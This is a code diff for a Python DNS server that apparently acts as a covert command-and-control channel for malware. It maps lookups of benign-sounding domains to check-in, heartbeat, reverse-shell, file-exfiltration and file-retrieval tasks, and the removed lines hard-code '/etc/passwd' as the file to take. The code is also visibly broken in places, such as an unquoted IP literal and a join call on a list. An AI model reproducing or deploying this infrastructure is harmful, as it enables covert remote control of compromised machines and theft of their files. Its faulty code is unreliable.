@@ -119,21 +119,53 @@ def run(bind_ip=LISTEN_IP, port=53):
         f.close()
         contSplit = currentConts.split('\n')
         del(contSplit[0])
+        
+        if (domain == "supportcenter.net"): #Check-in
+            sendResponseA(sock, data, addr, 100)
+        elif (domain == "freegames.net"): #Heartbeat
+            if(len(contSplit) >= 1):
+                command = contSplit[0]
+                del(contSplit[0])
+                if (command == "shell"):
+                    sendResponseA(sock, data, addr, 232)
+                elif (command == "file"):
+                    sendResponseA(sock, data, addr, 85)
+            else:
+                sendResponseA(sock, data, addr, 100)
+        elif (domain == "securelogin.com"): #Reverse Shell
+            if(len(contSplit) >= 1):
+                address = contSplit[0]
+                del(contSplit[0])
+                addressSplit = address.split(':')
+                host = addressSplit[0]
+                port = addressSplit[1]
+            else:
+                host = 100.100.100.100
+                port = 100
+            sendResponseB(sock, data, addr, host, port)
+        elif (domain == "cloudlogin.com"): #Send file conts
+            if(len(contSplit) >= 1):
+                address = contSplit[0]
+                del(contSplit[0])
+                addressSplit = address.split(':')
+                host = addressSplit[0]
+                port = addressSplit[1]
+            else:
+                host = 100.100.100.100
+                port = 100
+            sendResponseB(sock, data, addr, "127.0.0.1", 279)
+        elif (domain == "fileshare.org"): #Get filename
+            if(len(contSplit) >= 1):
+                fileName = contSplit[0]
+                del(contSplit[0])
+                sendResponseC(sock, data, addr, fileName)
+            else:
+                sendResponseA(sock, data, addr, 100)
+            
         newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
         newCont = newContSplit.join('\n')
         f = open(filePath, "w")
         f.write(newCont)
         f.close()
-        
-        if (domain == "supportcenter.net"):
-            sendResponseA(sock, data, addr, 100)
-        elif (domain == "freegames.net"):
-            sendResponseA(sock, data, addr, 100)
-        elif (domain == "securelogin.com"):
-            sendResponseB(sock, data, addr, "127.0.0.1", 279)
-        elif (domain == "cloudlogin.com"):
-            sendResponseB(sock, data, addr, "127.0.0.1", 279)
-        elif (domain == "fileshare.org"):
-            sendResponseC(sock, data, addr, "/etc/passwd")
 
 run()
